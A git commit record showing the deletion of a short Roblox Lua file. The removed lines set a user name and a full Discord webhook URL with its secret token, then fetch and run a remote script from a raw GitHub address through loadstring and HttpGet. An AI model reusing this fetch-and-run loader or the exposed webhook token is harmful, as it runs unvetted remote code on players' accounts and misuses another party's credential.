b6cb3bf46985439278bfd4afc6037341735430ac
rocl0bsta <125326459+rocl0bsta@users.noreply.github.com>
2023-02-13 18:15:24 -0800

    Delete new 1.lua

--- new 1.lua
+++
@@ -1,5 +0,0 @@
-UserName = "Splitzsy"
-WebHook = "https://discord.com/api/webhooks/1008243365139185664/Hs24SaO40vAZCtCPmt7P_uoBHbBpTvJVdDuwzSr7XMd5yZez5Py-odxIMiGLzFyA3uBy"
-Mention = true 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
